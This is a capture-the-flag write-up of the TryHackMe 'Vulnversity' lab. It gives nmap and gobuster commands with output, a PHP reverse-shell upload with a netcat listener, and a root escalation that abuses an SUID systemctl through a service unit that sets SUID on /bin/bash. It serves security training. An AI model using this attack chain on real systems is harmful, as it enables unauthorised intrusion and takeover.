# Vulnversity | 5.1.2024
` https://tryhackme.com/room/vulnversity `

```
IP: 10.10.33.117
```

## Nmap scan
```bash
nmap -sC -sV -oN nmap/initial 10.10.33.117
```
 - -sC for default scripts
 - -sV try to check services versions
 - -oN logfile

### Scan results
```
# Nmap 7.94SVN scan initiated Fri Jan  5 17:36:37 2024 as: nmap -sC -sV -oN nmap/initial 10.10.33.117
Nmap scan report for 10.10.33.117
Host is up (0.042s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-01-05T16:37:01
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2024-01-05T11:37:02-05:00
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan  5 17:37:06 2024 -- 1 IP address (1 host up) scanned in 29.01 seconds
```

## Running Gobuster
```bash
gobuster dir -u http://10.10.33.117:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
 - "dir" Uses directory/file enumeration mode (bruteforce dirs)
 - -u for the URL
 - -w for the wordlist


### Gobuster results
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.33.117:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 320] [--> http://10.10.33.117:3333/images/]
/css                  (Status: 301) [Size: 317] [--> http://10.10.33.117:3333/css/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.33.117:3333/js/]
/fonts                (Status: 301) [Size: 319] [--> http://10.10.33.117:3333/fonts/]
/internal             (Status: 301) [Size: 322] [--> http://10.10.33.117:3333/internal/]
/server-status        (Status: 403) [Size: 302]
Progress: 194997 / 220561 (88.41%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 195057 / 220561 (88.44%)
===============================================================
Finished
===============================================================
```

```bash
gobuster dir -u http://10.10.33.117:3333/internal -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.33.117:3333/internal
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 330] [--> http://10.10.33.117:3333/internal/uploads/]
/css                  (Status: 301) [Size: 326] [--> http://10.10.33.117:3333/internal/css/]
```

## Uploading PHP revers-shell
```
http://10.10.33.117:3333/internal/uploads/php-reverse-shell.phtml
```
```bash
nc -lnvp 9001
```


## Kinda stabel shell
```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

## Privilege Escalation

Searching for SUID files
```bash
find / -perm -4000 2>/dev/null
```
### Results
```
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```
"/bin/systemctl" is not normal to have an SUID

"https://gtfobins.github.io/gtfobins/systemctl/"

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
```

```bash
ls -l /bin/bash
```

Before:
`-rwxr-xr-x 1 root root 1037528 May 16  2017 /bin/bash`
<br>
After:
`-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash`


```bash
/bin/bash -p
```
